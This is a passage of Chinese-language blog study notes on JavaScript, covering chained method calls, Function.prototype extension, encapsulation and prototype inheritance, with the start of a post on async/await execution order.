class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = &#123;</span><br><span class=\"line\">  fn1: function() &#123;</span><br><span class=\"line\">    // DoSomeThing</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  fn2: () =&gt; &#123;</span><br><span class=\"line\">    // DoSomeThing </span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 链式调用</span><br><span class=\"line\">&gt; fnObj.fn1().fn2();</span><br></pre></td></tr></table></figure></p>\n<p><strong>构造函数原型链式调用</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">fnObj.prototype = &#123;</span><br><span class=\"line\">  fn1: function() &#123;</span><br><span class=\"line\">    // DoSomeThing</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  fn2: () =&gt; &#123;</span><br><span class=\"line\">    // DoSomeThing</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 使用时需要先创建一下</span><br><span class=\"line\">var a = new fnObj();</span><br><span class=\"line\">a.fn1().fn2();</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"1-9-函数祖先\"><a href=\"#1-9-函数祖先\" class=\"headerlink\" title=\"1.9 函数祖先\"></a>1.9 函数祖先</h2><p><code>prototype.js / lodash.js</code>, <code>js框架</code>;</p>\n<p>在内置对象<code>Function</code>原型上添加方法</p>\n<blockquote>\n<p>Function.prototype.fn1 = fucntion() {}</p>\n</blockquote>\n<p>// 函数形式</p>\n<blockquote>\n<p>var f = function() {};<br>f.fn1();</p>\n</blockquote>\n<p>// 构造函数</p>\n<blockquote>\n<p>var f = new Function();<br>f.fn1();</p>\n</blockquote>\n<p>此种方法不被推荐，污染原生对象<code>Function</code>, 可抽象出一个 统一添加方法的 功能方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在原型上挂载`addMethod`方法</span><br><span class=\"line\">Function.prototype.addMethod = function(name, fn) &#123;</span><br><span class=\"line\">  this[name] = fn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 两种生成实例的方法，任选其一</span><br><span class=\"line\">var methods = function() &#123;&#125;;</span><br><span class=\"line\">||</span><br><span class=\"line\">var methods = new Function();</span><br><span class=\"line\"></span><br><span class=\"line\">methods.addMethod(&apos;fn1&apos;, function() &#123;&#125;);</span><br><span class=\"line\">methods.addMethod(&apos;fn2&apos;, function() &#123;&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">methods.fn1();</span><br><span class=\"line\">methods.fn2();</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-10链式添加\"><a href=\"#1-10链式添加\" class=\"headerlink\" title=\"1.10链式添加\"></a>1.10链式添加</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在原型上挂载`addMethod`方法</span><br><span class=\"line\">Function.prototype.addMethod = function(name, fn) &#123;</span><br><span class=\"line\">  this[name] = fn;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 顺便支持`链式调用`</span><br><span class=\"line\">var fn = function() &#123;&#125;;</span><br><span class=\"line\">fn.addMethod(&apos;fn1&apos;, function() &#123;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;).addMethod(&apos;fn2&apos;, function() &#123;</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">fn.fn1().fn2();</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-11-类式调用\"><a href=\"#1-11-类式调用\" class=\"headerlink\" title=\"1.11 类式调用\"></a>1.11 类式调用</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在原型上挂载`addMethod`方法</span><br><span class=\"line\">Function.prototype.addMethod = function(name, fn) &#123;</span><br><span class=\"line\">  this.prototype[name] = fn;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 顺便支持`链式调用`</span><br><span class=\"line\">var fn = function() &#123;&#125;;</span><br><span class=\"line\">fn.addMethod(&apos;fn1&apos;, function() &#123;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;).addMethod(&apos;fn2&apos;, function() &#123;</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">// 调用时需要注意</span><br><span class=\"line\">var fns = new fn();</span><br><span class=\"line\">fns.fn1();</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a><strong>总结:</strong></h2><p>JS是一种<code>灵活</code>的语言, <code>函数</code>扮演一等公民。使用JS可以编写出更多<code>优雅的艺术代码</code>。</p>\n<p><strong>忆之获:</strong> 函数 多样化 创建/使用. <code>灵活性</code>是语言特有气质。团队开发慎重，尽量保证团队代码风格一致。易开发、可维护、代码规范必然要求。</p>\n<p><strong>问答:</strong></p>\n<ul>\n<li><p><strong>问： <a href=\"#1.5真假对象\">1.5真假对象</a> 一节中如何实现方法链式调用?</strong>\\<br>答：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fnObj = function() &#123;</span><br><span class=\"line\">  return &#123;</span><br><span class=\"line\">    fn1: function() &#123;</span><br><span class=\"line\">      return this;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    fn2: () =&gt; &#123;</span><br><span class=\"line\">      return this;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var fn = fnObj();</span><br><span class=\"line\">fn.fn1().fn2();</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>问：试定义一个可为函数添加多方法的<code>addMethod</code>方法。</strong>\\<br>答：参考<a href=\"#1.10链式添加\">1.10链式添加</a></p>\n<p><strong>方式一</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在原型上挂载`addMethod`方法</span><br><span class=\"line\">Function.prototype.addMethod = function(name, fn) &#123;</span><br><span class=\"line\">  this[name] = fn;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 顺便支持`链式调用`</span><br><span class=\"line\">var fn = function() &#123;&#125;;</span><br><span class=\"line\">fn.addMethod(&apos;fn1&apos;, function() &#123;</span><br><span class=\"line\">  return this;</span><br><span class=\"line\">&#125;).addMethod(&apos;fn2&apos;, function() &#123;</span><br><span class=\"line\">    return this;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">fn.fn1().fn2();</span><br></pre></td></tr></table></figure>\n<p><strong>方式二</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 定义 参数类型 接口</span><br><span class=\"line\">interface opt = &#123;</span><br><span class=\"line\">  fnName: string,</span><br><span class=\"line\">  fn: function</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 支持 一次性 创建多个方法</span><br><span class=\"line\">Function.prototype.addMethod = function(options: opt[]) &#123;</span><br><span class=\"line\">  for(obj of options) &#123;</span><br><span class=\"line\">    this[obj.fnName] = obj.fn;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  trturn this;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var methods = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fnName: &apos;fn1&apos;,</span><br><span class=\"line\">    fn: function() &#123;&#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fnName: &apos;fn2&apos;,</span><br><span class=\"line\">    fn: () =&gt; &#123;&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">var &apos;自定义Fn&apos; = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&apos;自定义Fn&apos;.addMethod(methods);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>问：试定义一个既可为函数添加多方法,又可为原型添加方法的<code>addMethod</code>方法。</strong>\\<br>答：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 定义 参数类型 接口</span><br><span class=\"line\">interface opt = &#123;</span><br><span class=\"line\">  fnName: string,</span><br><span class=\"line\">  fn: function</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 支持 一次性 创建多个方法</span><br><span class=\"line\">Function.prototype.addMethod = function(options: opt[], proto: string) &#123;</span><br><span class=\"line\">  if(proto === &quot;prototype&quot;) &#123;</span><br><span class=\"line\">    for(obj of options) &#123;</span><br><span class=\"line\">      this.protype[obj.fnName] = obj.fn;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    for(obj of options) &#123;</span><br><span class=\"line\">      this[obj.fnName] = obj.fn;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  trturn this;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"第二章-面向对象编程\"><a href=\"#第二章-面向对象编程\" class=\"headerlink\" title=\"第二章 面向对象编程\"></a><strong>第二章 面向对象编程</strong></h1><h2 id=\"2-1-面向对象-面向过程\"><a href=\"#2-1-面向对象-面向过程\" class=\"headerlink\" title=\"2.1 面向对象 面向过程\"></a>2.1 <code>面向对象</code> <code>面向过程</code></h2><p>面向对象编程 就是 将 需求 抽象成一个对象, 针对对象分析 特征(属性) / 动作(方法). 这个对象称为<code>类</code>.</p>\n<p><strong>核心思想：</strong><code>封装</code> <code>继承</code> <code>多继承</code> <code>多态</code></p>\n<h2 id=\"2-2-包装明星–封装\"><a href=\"#2-2-包装明星–封装\" class=\"headerlink\" title=\"2.2 包装明星–封装\"></a>2.2 包装明星–封装</h2><h3 id=\"2-2-1-创建一个类\"><a href=\"#2-2-1-创建一个类\" class=\"headerlink\" title=\"2.2.1 创建一个类\"></a>2.2.1 创建一个类</h3><p>首先声明一个函数，保存在一个变量里. 按编程习惯，将类名首字母大写.<br>然后在函数(类)内部通过对<code>this</code>(函数内部自带变量，用于指向当前对象)变量添加 属性/方法，实现对类添加<code>属性/方法</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var Book = function(id, bookName, price) &#123;</span><br><span class=\"line\">  this.id = id;</span><br><span class=\"line\">  this.bookName = bookName;</span><br><span class=\"line\">  this.price = price;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>也可通过<code>类</code>的原型(类本身也是对象，所以也有原型<code>prototype</code>)上添加<code>属性/方法</code>.\\<br>两种方式：</p>\n<p>①为原型对象属性赋值<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Book.prototype.show = function() &#123;&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>②将一个对象赋值给类的原型对象.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Book.prototype = &#123;</span><br><span class=\"line\">  show: function() &#123;&#125;,</span><br><span class=\"line\">  fn2: function() &#123;&#125;,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>两种模式不能混用</p>\n<p>使用时需要<code>new</code>关键字，实例化(创建)新对象.</p>\n<p><strong>关于对实例方法和原型方法解释：</strong><br>通过<code>this</code>添加的<code>方法/属性</code>，是在当前对象上添加的\\<br>JS是一种基于<code>prototype</code>原型的语言, 每创建一个对象(函数也是一种对象),都有一个prototype原型用于指向 其继承的 属性/方法. 通过prototype继承方法非对象自身所有，需要通过prototype逐级查找。<br>通过<code>this</code>定义的<code>方法/属性</code>，是对象自身拥有, 每次通过<code>类</code>创建新对象实例时，都会复制<code>类</code>本身方法、属性\\<br>prototype上方法/属性是继承来,状态共享, 不会被多次创建。</p>\n<h3 id=\"2-2-2-属性与方法封装\"><a href=\"#2-2-2-属性与方法封装\" class=\"headerlink\" title=\"2.2.2 属性与方法封装\"></a>2.2.2 属性与方法封装</h3><p>理解：</p>\n<ol>\n<li><p>通过JS函数作用域 实现 函数内部创建<br>面向对象思想:</p>\n<p><code>属性/方法</code> 的 隐藏、暴露, <code>私有属性/私有方法、公有属性/公有方法、保护属性/保护方法</code></p>\n</li>\n</ol>\n<p>JS通过<code>函数作用域</code>实现<code>私有属性/私有方法</code>;</p>\n<p><code>this</code>创建<code>公有属性/公有方法</code>, 通过<code>this</code>创建的公有方法，可以访问<code>类(创建时)||对象</code>的<code>私有属性/私有方法</code>, 由于这些方法权利比较大, 又称为<code>特权方法</code>;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 私有属性/私有方法, 特权方法, 对象公有属性/对象公有方法, 构造器</span><br><span class=\"line\">var Book = fucntion(id, name, price) &#123;</span><br><span class=\"line\">  // 私有属性</span><br><span class=\"line\">  var num = 1;</span><br><span class=\"line\">  // 私有方法</span><br><span class=\"line\">  function checkId() &#123;&#125;;</span><br><span class=\"line\">  </span><br><span class=\"line\">  // 特权方法</span><br><span class=\"line\">  this.getName = function() &#123;&#125;;</span><br><span class=\"line\">  this.getPrice = function() &#123;&#125;;</span><br><span class=\"line\">  this.setName = function() &#123;&#125;;</span><br><span class=\"line\">  this.setPrice = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 对象公有属性</span><br><span class=\"line\">  this.id = id;</span><br><span class=\"line\">  // 对象公有方法</span><br><span class=\"line\">  this.copy = function() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 构造器</span><br><span class=\"line\">  this.setName(name);</span><br><span class=\"line\">  this.setPrice(price);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>理解：</p>\n<ol>\n<li>通过JS<code>函数作用域</code>特征，来实现 函数内部创建 外部无法访问的<code>私有变量/私有方法</code></li>\n<li>通过<code>new</code>关键字，实例化对象时，会对<code>类</code>执行一次，所以<code>类</code>内部<code>this</code>上定义的<code>属性/方法</code>自然可复制到 新创建对象上，成为 <code>对象公有属性/公有方法</code> </li>\n<li>其中一些方法能访问到 <code>类</code>的<code>私有属性/私有方法</code>, 比外界权利大，得名<code>特权方法</code></li>\n<li>通过<code>new</code>关键字 实例化对象 时，执行了一遍<code>类</code>的函数，里面通过调用<code>特权方法</code>，初始化对象的一些属性。</li>\n<li><code>类</code>外部通过 点语法 定义 属性/方法: 通过<code>new</code>关键字创建新对象时，由于<code>类</code>外面通过 点语法 定义的<code>属性/方法</code>没有执行到，所以 <code>新创建对象中无法获取</code>，但可通过<code>类</code>来使用，因此在类外面通过 点语法 定义的 属性/方法 被称为 <code>类的静态公有属性/静态公有方法</code></li>\n<li><code>类</code>通过<code>prototype</code>创建的<code>属性/方法</code>在<code>类实例对象</code>中可通过this访问(新创建对象<em>proto</em>指向类的原型所指向的对象), 所以将<code>prototype</code>对象中<code>属性/方法</code>称为<code>公有属性/公有方法</code></li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 类静态公有属性(实例对象不能访问)</span><br><span class=\"line\">Book.isChinese = true;</span><br><span class=\"line\">// 类静态公有方法(实例对象不能访问)</span><br><span class=\"line\">Book.fn1 = function()&#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Book.prototype = &#123;</span><br><span class=\"line\">  // 公有属性</span><br><span class=\"line\">  isBook: false,</span><br><span class=\"line\">  // 公有方法</span><br><span class=\"line\">  fn2: function() &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过<code>new</code>关键字创建的对象 <strong>实质</strong> 是对 新对象<code>this</code>的不断赋值，并将prototype指向 类的prototype 所指向的对象。</p>\n<p>类的构造函数 外，通过点语法定义的属性/方法 是不会添加到 新创建 对象上去的。</p>\n<p>想要在新创建对象中使用静态公有属性，得通过 类本身，不能通过this。</p>\n<p>类的原型上定义的属性在 新对象里 可直接使用，因为 新对象 prototype和 类 的 prototype 指向同一对象</p>\n<p>类私有属性 和 静态方法 在 实例对象中访问不到</p>\n<p>公有属性在实例对象中可通过 点语法 访问到</p>\n<h3 id=\"2-2-3-闭包实现\"><a href=\"#2-2-3-闭包实现\" class=\"headerlink\" title=\"2.2.3 闭包实现\"></a>2.2.3 闭包实现</h3><p>类的静态变量 通过闭包实现</p>\n<h3 id=\"2-2-4-创建对象的安全模式\"><a href=\"#2-2-4-创建对象的安全模式\" class=\"headerlink\" title=\"2.2.4 创建对象的安全模式\"></a>2.2.4 创建对象的安全模式</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 创建一个图书类</span><br><span class=\"line\">var Book = function(title, time, type) &#123;</span><br><span class=\"line\">  this.title = title;</span><br><span class=\"line\">  this.time = time;</span><br><span class=\"line\">  this.type = type;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 实例化一本书</span><br><span class=\"line\">var book1 = Book(&apos;js&apos;, &apos;2018&apos;, &apos;js&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(book); // undefined</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(window.title);  // js</span><br><span class=\"line\">console.log(window.time);   // 2018</span><br><span class=\"line\">console.log(window.type);   // js</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<ol>\n<li>new关键字作用 可看做 对当前对象 this 不停赋值，例中 没有用new, 直接执行函数在全局作用域，this指向 全局变量window;</li>\n<li>变量book 最终作用 得到Book类(函数)执行结果, 函数没有return语句, 变量book 得不到 Book类 的返回值, 遂为 undefined</li>\n</ol>\n<p><strong>安全模式 || 检察长模式</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var Book = function(title, time, type) &#123;</span><br><span class=\"line\">  // 判断执行过程中 this 是否为 当前对象(为true说明是用 new关键字 创建)</span><br><span class=\"line\">  if(this instanceof Book)&#123;</span><br><span class=\"line\">    this.title = title;</span><br><span class=\"line\">    this.time = time;</span><br><span class=\"line\">    this.type = type;</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    // 否则重新创建对象并返回</span><br><span class=\"line\">    return new Book(title, time, type);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>总结：<br>每个类有 3部分</p>\n<ol>\n<li>第一部分是构造函数内，供实例化对象复制</li>\n<li>第二部分是构造函数外，直接通过点语法添加，供类直接使用，实例化对象访问不到</li>\n<li>第三部分是类的原型中，实例化对象可通过原型链间接访问，为所有实例化对象共用</li>\n</ol>\n<h2 id=\"2-3-继承\"><a href=\"#2-3-继承\" class=\"headerlink\" title=\"2.3 继承\"></a>2.3 继承</h2><h3 id=\"2-3-1-子类原型对象–类式继承\"><a href=\"#2-3-1-子类原型对象–类式继承\" class=\"headerlink\" title=\"2.3.1 子类原型对象–类式继承\"></a>2.3.1 子类原型对象–类式继承</h3><p><strong>类式继承</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 声明父类</span><br><span class=\"line\">function SuperClass() &#123;</span><br><span class=\"line\">  this.superValue = true;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 为父类添加公有方法</span><br><span class=\"line\">SuperClass.prototype.getSuperValue = function() &#123;</span><br><span class=\"line\">  return this.superValue;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 声明子类</span><br><span class=\"line\">function SubClass() &#123;</span><br><span class=\"line\">  this.subValue = false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 继承父类</span><br><span class=\"line\">SubClass.prototype = new SuperClass();</span><br><span class=\"line\">// 先继承，再为子类添加公有方法</span><br><span class=\"line\">SubClass.prototype.getSubValue = function() &#123;</span><br><span class=\"line\">  return this.subValue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 以上 类似`封装`的过程</span><br></pre></td></tr></table></figure></p>\n<p>总结：<br>类式继承 需要将 第一个类的实例 赋值给 第二个 类的原型\\<br>类的原型对象 作用是 为类的原型添加公有方法，类不能直接访问原型中的<code>属性/方法</code>，必须通过 原型prototype 来访问。\\<br>实例化一个父类时，新创建对象复制了父类构造函数内 属性/方法， 并且将 原型<em>proto</em> 指向父类原型对象， 如此便拥有 父类 原型对象/构造函数 上 属性/方法，</p>\n<p><strong>instanceof判断<code>对象</code>与<code>类</code>继承关系</strong>\\<br><code>instanceof</code>通过判断对象<code>prototype链</code>来确定<code>对象</code>是否为<code>某类</code>实例，不关心<code>对象</code>与<code>类</code>自身结构</p>\n<blockquote>\n<p>console.log(obj instanceof Class); // true<br>console.log(SubClass instanceof ParentClass); // false</p>\n</blockquote>\n<p>instanceof 判断 前面对象是否为 后面 类(对象)实例，不表示两者的继承\\<br>子类 继承 父类 时通过将 父类实例 赋值给 子类原型prototype, 子类原型 继承 父类 </p>\n<blockquote>\n<p>console.log(SubClass.prototype instanceof ParentClass); // true</p>\n</blockquote>\n<p>所有<code>对象</code>都继承自<code>Object</code>原生对象构造函数</p>\n<blockquote>\n<p>console.log(allObj instanceof Object); // true</p>\n</blockquote>\n<h4 id=\"类式继承缺点\"><a href=\"#类式继承缺点\" class=\"headerlink\" title=\"类式继承缺点\"></a>类式继承缺点</h4><ol>\n<li><code>子类</code>通过<code>原型prototype</code>对<code>父类实例化</code>, 继承父类。</li>\n</ol>\n"},{"title":"JavaScript运行时","date":"2018-05-31T02:47:18.000Z","_content":"## Promise Async/await 运行时机制\n故事要从一道今日头条的笔试题说起～ \n\n题目来源：[半年工作经验今日头条和美团面试题面经分享！！！！！](https://juejin.im/post/5b03e79951882542891913e8)\n\n````\nasync function async1(){\n\n    console.log('async1 start')\n\n    await async2()\n\n    console.log('async1 end')\n\n}\n\nasync function async2(){\n\n    console.log('async2')\n\n}\n\nconsole.log('script start')\n\nsetTimeout(function(){\n\n    console.log('setTimeout') \n\n},0)  \n\nasync1();\n\nnew 